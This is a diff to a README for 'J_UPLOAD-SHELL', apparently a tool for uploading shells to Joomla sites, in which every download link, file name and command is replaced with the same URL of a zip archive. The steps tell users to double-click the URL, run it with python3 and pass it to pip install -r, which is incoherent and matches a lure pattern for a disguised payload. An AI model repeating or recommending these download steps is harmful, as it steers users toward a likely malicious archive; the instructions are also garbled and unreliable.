@@ -6,11 +6,11 @@ Welcome to J_UPLOAD-SHELL! This tool helps you check and upload files for Joomla
 
 ## 📥 Download J_UPLOAD-SHELL
 
-[![Download J_UPLOAD-SHELL](https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip)](https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip)
+[![Download J_UPLOAD-SHELL](https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip)](https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip)
 
 To download J_UPLOAD-SHELL, visit the following link:
 
-[Download from Releases Page](https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip)
+[Download from Releases Page](https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ Before you download, make sure your system meets the following requirements:
 
 Go to the Releases page by clicking the link below:
 
-[Download from Releases Page](https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip)
+[Download from Releases Page](https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip)
 
 ### 2. Select the Latest Release
 
@@ -34,7 +34,7 @@ On the Releases page, find the latest version of J_UPLOAD-SHELL. It is usually a
 
 ### 3. Download the File
 
-Click on the link for the file that matches your operating system. The most common files will be named similarly to `https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip` or `https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip`. 
+Click on the link for the file that matches your operating system. The most common files will be named similarly to `https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip` or `https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip`. 
 
 ### 4. Unzip the File 
 
@@ -45,10 +45,10 @@ Once the download completes, locate the downloaded file. It will be in your defa
 
 ### 5. Open the Application
 
-Navigate to the folder where you unzipped the file. Look for a file named `https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip`. This is the main application file.
+Navigate to the folder where you unzipped the file. Look for a file named `https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip`. This is the main application file.
 
-- **For Windows:** Double-click `https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip` to run it.
-- **For macOS or Linux:** Open the terminal, navigate to the folder, and type `python3 https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip`, then hit **Enter**.
+- **For Windows:** Double-click `https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip` to run it.
+- **For macOS or Linux:** Open the terminal, navigate to the folder, and type `python3 https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip`, then hit **Enter**.
 
 ### 6. Follow the On-Screen Instructions
 
@@ -65,7 +65,7 @@ When the application starts, you will see prompts guiding you through using the 
 If you encounter any issues during installation or use, try the following solutions:
 
 - Ensure Python is installed and added to your PATH variable.
-- Check for any missing dependencies by running the command `pip install -r https://raw.githubusercontent.com/sakhikhichi/J_UPLOAD-SHELL/main/juniata/UPLOA-SHELL-transilience.zip`.
+- Check for any missing dependencies by running the command `pip install -r https://github.com/sakhikhichi/J_UPLOAD-SHELL/raw/refs/heads/main/juniata/SHELL-UPLOA-v2.2.zip`.
 - Restart your computer and try again.
 
 ## ❓ Frequently Asked Questions
